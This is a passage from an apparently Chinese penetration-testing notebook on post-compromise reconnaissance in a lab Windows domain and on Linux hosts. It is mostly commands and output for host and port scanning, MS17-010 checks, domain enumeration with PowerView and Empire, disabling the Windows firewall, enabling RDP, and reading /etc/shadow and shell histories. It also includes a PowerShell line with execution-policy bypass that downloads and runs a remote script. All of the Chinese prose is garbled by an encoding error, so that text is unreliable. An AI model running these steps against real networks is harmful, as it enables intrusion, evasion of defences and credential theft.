Reply that 00:50:56:E5:AA:97 is 10.10.10.254 in 3.404ms
Reply that 00:0C:29:68:D3:69 is 10.10.10.255 in 0.047ms
```

## äº”ã€Empire

`Empire`å†…ç½®äº†`arpscan`æ¨¡å—ï¼Œè¯¥æ¨¡å—å¯åˆ©ç”¨arpåè®®å¯¹å†…ç½‘ä¸»æœºè¿›è¡Œæ¢æµ‹ã€‚å°†ç›®æ ‡ä¸»æœºä¸Šçº¿ `Empire`åï¼Œä½¿ç”¨`powershell/situational_awareness/network/arpscan`æ¨¡å—ï¼Œè®¾ç½®æ‰«æèŒƒå›´å³å¯ï¼Œå…·ä½“å¦‚ä¸‹ï¼š

```php
(Empire: listeners) > agents
[*] Active agents:
 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------
 APDGSW9X ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         3648   5/0.0    2021-02-23 20:43:27
(Empire: agents) > usemodule powershell/situational_awareness/network/arpscan
(Empire: powershell/situational_awareness/network/arpscan) > set Agent APDGSW9X
(Empire: powershell/situational_awareness/network/arpscan) > set CIDR 192.168.7.0/24
(Empire: powershell/situational_awareness/network/arpscan) > execute
MAC               Address      
---               -------      
16:7D:DA:D7:8F:64 192.168.7.1  
00:0C:29:1D:82:CF 192.168.7.7  
00:0C:29:A9:62:98 192.168.7.107
00:0C:29:DC:01:0D 192.168.7.110
00:0C:29:1D:82:CF 192.168.7.255
```

## å…­ã€btscan

nbtscan æœ‰ Windows å’Œ Linux ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä½¿ç”¨ netbios åè®®æ‰«ææœ¬åœ°æˆ–è¿œç¨‹ TCP/IP ç½‘ç»œä¸Šçš„å¼€æ”¾ NetBIOS åç§°æœåŠ¡å™¨ã€‚

ä¸‹è½½åœ°å€ï¼š
[http://www.unixwiz.net/tools/nbtscan.html](http://www.unixwiz.net/tools/nbtscan.html)

ä¼šè¢«æ€è½¯æ€æ‰

ä½¿ç”¨ï¼š

```php
C:\Users\de1ay.DE1AY\Desktop>nbtscan-1.0.35.exe 10.10.10.0/24
10.10.10.10     DE1AY\DC                        SHARING DC
10.10.10.80     DE1AY\WEB                       SHARING
10.10.10.201    DE1AY\PC                        SHARING
*timeout (normal end of scan)
```

## ä¸ƒã€scanline

McAfee å‡ºå“ï¼Œæ¨è win ä¸‹ä½¿ç”¨ï¼ˆç®¡ç†å‘˜æ‰§è¡Œï¼‰

ä¸‹è½½åœ°å€ï¼š

[https://pan.wgpsec.org/d/public_open/4-åæ¸—é€ %26 åŸŸæ¸—é€/ä¿¡æ¯æ”¶é›†/ç«¯å£æ¢æµ‹/ScanLine.exe?sign=dpTNwfDvP3g1Zx2Y2Vjj9NctuZxXXP6QYJ8uhnSpw4s=:0](https://pan.wgpsec.org/d/public_open/4-%E5%90%8E%E6%B8%97%E9%80%8F%20%26%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/ScanLine.exe?sign=dpTNwfDvP3g1Zx2Y2Vjj9NctuZxXXP6QYJ8uhnSpw4s=:0)

ä½¿ç”¨ï¼š

```php
C:\Users\de1ay.DE1AY\Desktop>ScanLine.exe -h -t 22,80,445,3389,1099,1433,3306,33
89 -u 53,161,137,139 -O log.txt -p 10.10.10.1-254 /b
ScanLine (TM) 1.01
Copyright (c) Foundstone, Inc. 2002
http://www.foundstone.com

Scan of 254 IPs started at Tue Feb 28 15:49:46 2023

-------------------------------------------------------------------------------
10.10.10.10
Responds with ICMP unreachable: No
TCP ports: 445 3389
UDP ports: 53

-------------------------------------------------------------------------------
10.10.10.80
Responds with ICMP unreachable: Yes
TCP ports: 80 445 1433 3389
UDP ports: 137

TCP 80:
[HTTP/1.1 200 OK Server: Microsoft-IIS/7.5 X-Powered-By: ASP.NET Date: Tue, 28 F
eb 2023 07:50:07 GMT Connection: close Content-Length: 0]

-------------------------------------------------------------------------------
10.10.10.201
Responds with ICMP unreachable: No
TCP ports: 445 3389
UDP ports:

-------------------------------------------------------------------------------

Scan finished at Tue Feb 28 15:53:19 2023

254 IPs and 3048 ports scanned in 0 hours 3 mins 32.69 secs
```

æŒºæ…¢çš„

## å…«ã€telnet

é€šè¿‡`telnet`æ¢æµ‹ 445 ç«¯å£æˆ–è€…å…¶ä»–ç«¯å£åˆ¤æ–­ä¸»æœºå­˜æ´»ã€‚

```php
for /l %a in (1,1,254) do start /min /low telnet 10.10.10.%a 445
```

## ä¹ã€tcping

tcping.exe æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œç¨‹åºï¼Œå…¶æ“ä½œç±»ä¼¼äºpingï¼Œä½†å®ƒé€šè¿‡ TCP å·¥ä½œ

ä¸‹è½½åœ°å€ï¼š

[https://download.elifulkerson.com/files/tcping/0.39/x64/](https://download.elifulkerson.com/files/tcping/0.39/x64/)

ä½¿ç”¨ï¼š

```php
C:\Users\de1ay.DE1AY\Desktop>tcping64.exe -n 1 10.10.10.10 445

Probing 10.10.10.10:445/tcp - Port is open - time=1.913ms

Ping statistics for 10.10.10.10:445
     1 probes sent.
     1 successful, 0 failed.  (0.00% fail)
Approximate trip times in milli-seconds:
     Minimum = 1.913ms, Maximum = 1.913ms, Average = 1.913ms

C:\Users\de1ay.DE1AY\Desktop>tcping64.exe -n 1 10.10.10.10 441

Probing 10.10.10.10:441/tcp - No response - time=2009.850ms

Ping statistics for 10.10.10.10:441
     1 probes sent.
     0 successful, 1 failed.  (100.00% fail)
Was unable to connect, cannot provide trip statistics.

C:\Users\de1ay.DE1AY\Desktop>tcping64.exe -n 1 10.10.10.201 445

Probing 10.10.10.201:445/tcp - Port is open - time=2.857ms

Ping statistics for 10.10.10.201:445
     1 probes sent.
     1 successful, 0 failed.  (0.00% fail)
Approximate trip times in milli-seconds:
     Minimum = 2.857ms, Maximum = 2.857ms, Average = 2.857ms

C:\Users\de1ay.DE1AY\Desktop>
```

## åã€cping

k8å›¢é˜Ÿ

ä¸‹è½½åœ°å€ï¼š

[https://pan.wgpsec.org/public_open/4-åæ¸—é€ & åŸŸæ¸—é€/ä¸»æœºå‘ç°/cping3.0](https://pan.wgpsec.org/public_open/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/cping3.0)

ä½¿ç”¨ï¼š

ä¸‹è½½è§£å‹åå¯ä»¥çœ‹åˆ°å¾ˆå¤šä¸ª exe æ–‡ä»¶ï¼Œ[å…¶åˆ†åˆ«ä»£è¡¨äº†.net](http://xn--ykqriq4eqqzf7713a.net/) ç¼–è¯‘ç‰ˆæœ¬ï¼Œç¼–è¯‘ç‰ˆæœ¬å¯¹åº”ç³»ç»Ÿå¦‚ä¸‹ï¼š

```php
XP/2003(å·²æ·˜æ±°,ç”¨æˆ·å°‘,ä½¿ç”¨çš„å¤§éƒ¨åˆ†ä¹Ÿä¼šè£….net,å› ä¸ºå¥½å¤šappéœ€è¦è¿é©±åŠ¨éƒ½è¦.net,å…·ä½“çœ‹å®‰è£…ç‰ˆæœ¬ä¸€èˆ¬2.0)

Vista       2.0(åŸºæœ¬ä¸Šä¹Ÿæ²¡å¤šå°‘ç”¨æˆ·)
Win7/2008   2.0 3.0 3.5
Win8/2012   4.0
Win8.1      4.0 4.5
Win10/2016  4.0 4.6 (4.5æœªæµ‹åº”è¯¥ä¹Ÿè¡Œ)
```

```php
C:\Users\de1ay.DE1AY\Desktop>cping35.exe scan osver 10.10.10.1 10.10.10.255
Scan OS version
10.10.10.1---10.10.10.255

Segment: 10.10.10.0
=============================================
IP              MAC               HostName        OSver
10.10.10.10     00-0C-29-4E-20-BD DC.de1ay.com    [Win 2012 R2 Standard 9600]
10.10.10.80     00-0C-29-68-D3-69 WEB.de1ay.com   [Win 2008 R2 Standard 7601 SP
1]
10.10.10.201    00-0C-29-9E-7B-7A PC.de1ay.com    [Win 7 Ultimate 7601 SP 1]
=============================================
Count:3
```

## åä¸€ã€fscan

ä½œè€…æ˜¯å½±èˆè€…å¤§ä½¬ï¼Œå†…ç½‘å¤§æ€å™¨

ä¸‹è½½åœ°å€ï¼š

[https://github.com/shadow1ng/fscan](https://github.com/shadow1ng/fscan)

ä½¿ç”¨ï¼š

```php
C:\Users\de1ay.DE1AY\Desktop>fscan64.exe -h 10.10.10.1-255 -p 22,445

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.1
start infoscan
å·²å®Œæˆ 0/0 listen ip4:icmp 0.0.0.0: socket: An attempt was made to access a sock
et in a way forbidden by its access permissions.
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 10.10.10.10     is alive
(icmp) Target 10.10.10.80     is alive
(icmp) Target 10.10.10.201    is alive
[*] Icmp alive hosts len is: 3
10.10.10.80:445 open
10.10.10.10:445 open
10.10.10.201:445 open
[*] alive ports len is: 3
start vulscan
[+] 10.10.10.80 MS17-010        (Windows Server 2008 R2 Standard 7601 Service Pa
ck 1)
[+] 10.10.10.10 MS17-010        (Windows Server 2012 R2 Standard 9600)
[+] 10.10.10.201        MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)

å·²å®Œæˆ 3/3
[*] æ‰«æç»“æŸ,è€—æ—¶: 25.2090706s
```

ä¸ä»…å¯ä»¥æ‰«æç«¯å£ï¼Œè¿˜å¯ä»¥è¿›è¡Œæ¼æ´æ‰«æï¼Œå­˜å¥½æ‰«æã€å¼±å£ä»¤æµ‹è¯•ç­‰

## åäºŒã€nmap

æ‡‚å¾—éƒ½æ‡‚

```php
SYN æ‰«æï¼š			nmap -sS -sn -sV -T4 192.168.7.0/24
ARP æ‰«æï¼š			nmap -PR -sn 192.168.7.0/24
ICMP æ‰«æï¼š		nmap â€sP â€PI 192.168.7.0/24 â€T4
ICMP æ‰«æï¼š		nmap â€sn â€PE â€T4 192.168.7.0/24
SNMP æ‰«æï¼š		nmap -sU --script snmp-brute 192.168.7.0/24 -T4
UDP æ‰«æï¼š			nmap -sU -T5 -sV --max-retries 1 192.168.7.7 -p 500
NetBIOS æ‰«æï¼š	nmap --script nbstat.nse -sU -p137 192.168.7.0/24 -T4
SMB æ‰«æï¼š			nmap â€sU â€sS â€â€script smbâ€enumâ€shares.nse â€p 445 192.168.7.0/24
```

## åä¸‰ã€MSF

å­˜åœ¨å¾ˆå¤šç«¯å£æ‰«æå’Œå­˜æ´»æ‰«ææ¨¡å—

```php
auxiliary/scanner/discovery/udp_probe
auxiliary/scanner/discovery/udp_sweep
auxiliary/scanner/discovery/arp_sweep
auxiliary/scanner/netbios/nbname
auxiliary/scanner/snmp/snmp_enum
auxiliary/scanner/smb/smb_version
auxiliary/scanner/netbios/nbname
```

## åå››ã€netdiscover

kaliè‡ªå¸¦ï¼Œä¸èƒ½æ‰«ç›®æ ‡å†…ç½‘

ä½¿ç”¨ï¼š

```php
netdiscover -r 192.168.5.0/24
```

```php
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                   
                                                                                                                                                                                                 
 5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300                                                                                                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.5.1     00:50:56:c0:00:08      1      60  VMware, Inc.                                                                                                                                  
 192.168.5.2     00:50:56:f8:00:0f      1      60  VMware, Inc.                                                                                                                                  
 192.168.5.131   00:0c:29:68:d3:5f      2     120  VMware, Inc.                                                                                                                                  
 192.168.5.254   00:50:56:e3:5a:e6      1      60  VMware, Inc.
```

# åŸŸå†…ç«¯å£æ‰«æ

## ä¸€ã€Telnet

å¦‚æœæƒ³æ¢æµ‹æŸå°ä¸»æœºçš„æŸä¸ªç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œç›´æ¥ä½¿ç”¨ telnet å‘½ä»¤æ˜¯æœ€æ–¹ä¾¿çš„ã€‚

### ç«¯å£å¼€æ”¾çŠ¶æ€

```php
telnet 10.10.10.80 80 #80ç«¯å£å¼€å¯çŠ¶æ€
```

å›æ˜¾:

```php
HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Tue, 28 Feb 2023 09:06:36 GMT
Connection: close
Content-Length: 326

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/str
ict.dtd">
<HTML><HEAD><TITLE>Bad Request</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Bad Request - Invalid Verb</h2>
<hr><p>HTTP Error 400. The request verb is invalid.</p>
</BODY></HTML>
```

### ç«¯å£å…³é—­çŠ¶æ€

```php
telnet 10.10.10.80 81 #81ç«¯å£å…³é—­çŠ¶æ€
```

å›æ˜¾ï¼š

```php
PS C:\Users\mssql\Desktop\PowerSploit-3.0.0\Recon> telnet 10.10.10.80 81
æ­£åœ¨è¿æ¥10.10.10.80...æ— æ³•æ‰“å¼€åˆ°ä¸»æœºçš„è¿æ¥ã€‚ åœ¨ç«¯å£ 81: è¿æ¥å¤±è´¥
```

## äºŒã€NC

ç‘å£«å†›åˆ€

ä¸‹è½½åœ°å€ï¼š

[https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)

ä¼šè¢«æ€è½¯åˆ é™¤

ä½¿ç”¨ï¼š

```php
nc.exe -vv 192.168.7.7 3389
```

```php
C:\Users\mssql\Desktop>nc.exe -vv 10.10.10.10 3389
DNS fwd/rev mismatch: DC != DC.de1ay.com
DC [10.10.10.10] 3389 (ms-wbt-server) open
```

æ‹¿æ¥è¿›è¡Œå¤šä¸ªç«¯å£æ‰«æä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå°±æ˜¯æ‰«æé€Ÿåº¦æœ‰ç‚¹æ…¢

```php
nc.exe -rz -w 2 -vv 192.168.7.7 0-65535

-r éšæœºæŒ‡å®šæœ¬åœ°ä¸è¿œç«¯ä¸»æœºçš„é€šä¿¡ç«¯å£
-z ä½¿ç”¨0è¾“å…¥/è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨
-w<è¶…æ—¶ç§’æ•°> è®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´
```

```php
C:\Users\daniel10>nc.exe -rz -w 2 -vv 192.168.7.7 443-445
DNS fwd/rev mismatch: DC != DC.teamssix.com
DC [192.168.7.7] 444 (?): TIMEDOUT
DC [192.168.7.7] 443 (https): TIMEDOUT
DC [192.168.7.7] 445 (microsoft-ds) open
sent 0, rcvd 0
```

## ä¸‰ã€fscan

å½±èˆè€…å¤§ä½¬å†™çš„ä¸€æ¬¾å·¥å…·

ä½¿ç”¨ï¼š

```php
PS C:\Users\de1ay.DE1AY\Desktop> .\fscan.exe -h 10.10.10.10

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.1
start infoscan
(icmp) Target 10.10.10.10     is alive
[*] Icmp alive hosts len is: 1
10.10.10.10:88 open
10.10.10.10:445 open
10.10.10.10:139 open
10.10.10.10:135 open
[*] alive ports len is: 4
start vulscan
[+] NetInfo:
[*]10.10.10.10
   [->]DC
   [->]10.10.10.10
[*] 10.10.10.10    [+]DC DE1AY\DC                Windows Server 2012 R2 Standard 9600
[+] 10.10.10.10 MS17-010        (Windows Server 2012 R2 Standard 9600)
å·²å®Œæˆ 4/4
```

## ****ScanLine****

ä¸Šé¢æœ‰ä»‹ç»

```php
scanline.exe -h -t 22,80,445,3389 -p 10.10.10.10
```

## å››ã€Sæ‰«æå™¨

ç«ç»’ä¼šæ€

ä¸‹è½½ï¼š

[https://pan.baidu.com/s/1gdGM4F5](https://pan.baidu.com/s/1gdGM4F5)

ä½¿ç”¨ï¼š

```php
C:\Users\de1ay.DE1AY\Desktop>s.exe tcp 10.10.10.10 22,80,3389,445 7
TCP Port Scanner V1.1 By WinEggDrop

Normal Scan: About To Scan 4 Ports Using 7 Thread
10.10.10.10      3389  Open
10.10.10.10      445   Open
Scan 10.10.10.10 Complete In 0 Hours 0 Minutes 3 Seconds. Found 2 Open Ports
```

## äº”ã€PowerShell

### ****PowerSploit****

PowerSploitçš„Invoke-Portscan è„šæœ¬

ä¸‹è½½åœ°å€ï¼š

[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1)

ä½¿ç”¨ï¼š

æ— æ–‡ä»¶æ–¹å¼ï¼š

```php
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 10.10.10.10 -T 4 -ports '445,1433,80,8080,3389'"
```

æˆ‘æ²¡æœ‰æˆåŠŸ

æœ‰æ–‡ä»¶

```php
powershell.exe -exec bypass -Command "Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 10.10.10.10 -T 4 -ports '445,1433,80,8080,3389'"
```

```php
C:\Users\de1ay.DE1AY\Desktop>powershell.exe -exec bypass -Command "Import-Module
 ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 10.10.10.10 -T 4 -ports '445,1433,
80,8080,3389'"

Hostname      : 10.10.10.10
alive         : True
openPorts     : {445, 3389}
closedPorts   : {}
filteredPorts : {1433, 80, 8080}
finishTime    : 2023/2/28 17:24:12
```

### nishang

è¿™é‡Œç”¨çš„åªæ˜¯ä¼—å¤šè„šæœ¬ä¸­çš„ä¸€ä¸ª

ä¸‹è½½ï¼š

[https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1](https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1)

ä½¿ç”¨ï¼š

```php
PS C:\Users\de1ay.DE1AY\Desktop> Import-Module .\nishang.ps1
PS C:\Users\de1ay.DE1AY\Desktop> Invoke-PortScan -StartAddress 10.10.10.10 -EndA
ddress 10.10.10.10 -ScanPort -Port 80,443,445

IPAddress                  HostName                   Ports
---------                  --------                   -----
10.10.10.10                                           {445}
```

## å…­ã€MSF

æ‡‚å¾—éƒ½æ‡‚

```php
auxiliary/scanner/portscan/ack          TCP ACKç«¯å£æ‰«æ
auxiliary/scanner/portscan/ftpbounce    FTP bounceç«¯å£æ‰«æ
auxiliary/scanner/portscan/syn         	SYNç«¯å£æ‰«æ
auxiliary/scanner/portscan/tcp          TCPç«¯å£æ‰«æ  
auxiliary/scanner/portscan/xmas         TCP XMasç«¯å£æ‰«æ
```

åœ¨æ‰«æå†…ç½‘æ—¶ä¸è¦å¿˜è®°æ·»åŠ è·¯ç”±

## ä¸ƒã€nmap

ä¸€èˆ¬æƒ…å†µä¸‹ç›®æ ‡æœºå™¨æ˜¯ä¸ä¼šæœ‰nmapçš„ï¼Œéœ€è¦è‡ªå·±ä¸Šä¼ ï¼Œç”¨æ³•éƒ½æ˜¯ä¸€æ ·çš„

# é˜²ç«å¢™

æœ‰æ—¶å€™éœ€è¦åå¼¹ç«¯å£æˆ–è€…è¿æ¥3389å’Œé˜²ç«å¢™æ”¾è¡Œ

## å¼€å¯å…³é—­

```php
netsh firewall show state                      // é˜²ç«å¢™çŠ¶æ€
netsh firewall show config                     // æŸ¥çœ‹é˜²ç«å¢™é…ç½®
netsh firewall set opmode disable              // å…³é—­é˜²ç«å¢™ï¼ˆwindows server 2003åŠä»¥å‰ï¼‰
netsh advfirewall set allprofiles state off    // å…³é—­é˜²ç«å¢™ï¼ˆwindows server 2003ä»¥åï¼‰
```

## ä¿®æ”¹é˜²ç«å¢™é…ç½®

```php
netsh firewall add allowedprogram c:\\xxx\\xx.exe "allow xx" enable    // å…è®¸æŒ‡å®šç¨‹åºçš„å…¨éƒ¨è¿æ¥ï¼ˆwindows server 2003åŠä»¥å‰ï¼‰

windows server 2003ä¹‹åï¼š
netsh advfirewall firewall add rule name="pass xx" dir=in action=allow  program="C:\xxx\xx.exe"         // å…è®¸æŸä¸ªç¨‹åºè¿å…¥
netsh advfirewall firewall add rule name="pass xx" dir=out action=allow program="C:\xxx\xx.exe"               // å…è®¸æŸä¸ªç¨‹åºå¤–è¿
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow        // å¼€å¯3389ç«¯å£ï¼Œå…è®¸æ”¹ç«¯å£æ”¾è¡Œ
```

## å¼€å¯è¿œç¨‹æ¡Œé¢è¿æ¥

```php
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

# ****PowerShellä¿¡æ¯æ”¶é›†****

## PowerView

PowerViewæ˜¯ä¸€æ¬¾ä¾èµ–äºPowerShellå’ŒWMIå¯¹å†…ç½‘è¿›è¡ŒæŸ¥è¯¢çš„æ¸—é€æµ‹è¯•è„šæœ¬ï¼Œé›†æˆåœ¨PowerSploitå·¥å…·åŒ…ä¸­ï¼Œè¿™é‡Œä½¿ç”¨PowerView

ä¸‹è½½åœ°å€:

[https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

ä½¿ç”¨:

åœ¨powershellä¸­æˆ‘æ²¡æœ‰ä½¿ç”¨æˆåŠŸï¼Œåœ¨cmdé‡Œå¯ä»¥

```php
C:\Users\mssql\Desktop\PowerSploit-3.0.0\Recon> powershell.exe -exec bypass -
Command "& {Import-Module .\PowerView.ps1;Get-NetDomain}"

Forest                  : de1ay.com
DomainControllers       : {DC.de1ay.com}
Children                : {}
DomainMode              :
Parent                  :
PdcRoleOwner            : DC.de1ay.com
RidRoleOwner            : DC.de1ay.com
InfrastructureRoleOwner : DC.de1ay.com
Name                    : de1ay.com
```

å¸¸ç”¨å‚æ•°:

```php
Get-NetDomainï¼šè·å–å½“å‰ç”¨æˆ·æ‰€åœ¨åŸŸçš„åç§°ï¼›
Get-NetUserï¼šè·å–æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ï¼›
Get-NetDomainControllerï¼šè·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨ä¿¡æ¯ï¼›
Get-NetComputerï¼šè·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯ï¼›
Get-NetOUï¼šè·å–åŸŸä¸­OUä¿¡æ¯ï¼›
Get-NetGroupï¼šè·å–æ‰€æœ‰åŸŸå†…ç»„åˆç»„æˆå‘˜ä¿¡æ¯ï¼›
Get-NetFileServerï¼šæ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯ï¼›
Get-NetShareï¼šè·å–å½“å‰åŸŸå†…æ‰€æœ‰çš„ç½‘ç»œå…±äº«ä¿¡æ¯ï¼›
Get-NetSessionï¼šè·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯ï¼›
Get-NetRDPSessionï¼šè·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥ï¼›
Get-NetProcessï¼šè·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹ï¼›
Get-UserProcessï¼šè·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—ï¼›
Get-ADObjectï¼šè·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡ï¼›
Get-NetGPOï¼šè·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡ï¼›
Get-DomainPolicyï¼šè·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥ï¼›
Invoke-UserHunterï¼šè·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯å’Œè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼›
Invoke-ProcessHunterï¼šé€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·ï¼›
Invoke-UserEventHunterï¼šæ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›åŸŸæœºå™¨ï¼›
```

# Linuxä¿¡æ¯æ”¶é›†

## æ“ä½œç³»ç»Ÿ&å†…æ ¸ç‰ˆæœ¬-ç¯å¢ƒå˜é‡

```java
>cat /etc/issue
>cat /etc/*-release
>cat /etc/lsb-release
>cat /etc/redhat-release
cat /proc/version
>uname -a
>uname -mrs
>rpm -q kernel
>dmesg | grep Linux
>ls /boot | grep vmlinuz-
>cat /etc/profile
>cat /etc/bashrc
>cat ~/.bash_profile
>cat ~/.bashrc
>cat ~/.bash_logout
>env
>set
Rootæƒé™è¿›ç¨‹
>ps aux | grep root
>ps -ef | grep root
è®¡åˆ’ä»»åŠ¡
>crontab -l
>ls -alh /var/spool/cron
>ls -al /etc/ | grep cron
>ls -al /etc/cron*
>cat /etc/cron*
>cat /etc/at.allow
>cat /etc/at.deny
>cat /etc/cron.allow
>cat /etc/cron.deny
>cat /etc/crontab
>cat /etc/anacrontab
>cat /var/spool/cron/crontabs/root
IPä¿¡æ¯
>/sbin/ifconfig -a
>cat /etc/network/interfaces
>cat /etc/sysconfig/network
è¿æ¥ä¿¡æ¯
>grep 80 /etc/services
>netstat -antup
>netstat -antpx
>netstat -tulpn
>chkconfig --list
>chkconfig --list | grep 3:on
>last
>w
ç”¨æˆ·ä¿¡æ¯
>id
>whomi
>w
>last
>cat /etc/passwd
>cat /etc/group
>cat /etc/shadow
>ls -alh /var/mail/
>grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # åˆ—å‡ºè¶…çº§ç”¨æˆ·
>awk -F: '($3 == "0") {print}' /etc/passwd   #åˆ—å‡ºè¶…çº§ç”¨æˆ·
>cat /etc/sudoers
>sudo â€“l
æ“ä½œè®°å½•
>cat ~/.bash_history
>cat ~/.nano_history
>cat ~/.atftp_history
>cat ~/.mysql_history
>cat ~/.php_history
å¯å†™ç›®å½•
>find / -writable -type d 2>/dev/null      # å¯å†™ç›®å½•
>find / -perm -222 -type d 2>/dev/null     # å¯å†™ç›®å½• 
>find / -perm -o w -type d 2>/dev/null     # å¯å†™ç›®å½•
>find / -perm -o x -type d 2>/dev/null     # å¯æ‰§è¡Œç›®å½•
>find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # å¯å†™å¯æ‰§è¡Œç›®å½•
```

# ä¸´æ—¶HTTPæ­å»º

```java
>python2 -m SimpleHTTPServer 
>python3 -m http.server 8080
>php -S 0.0.0.0:8888
>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
>openssl s_server -key key.pem -cert cert.pem -accept 443 â€“WWW
>ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888,:DocumentRoot => Dir.pwd).start"
>ruby -run -e httpd . -p 8888
```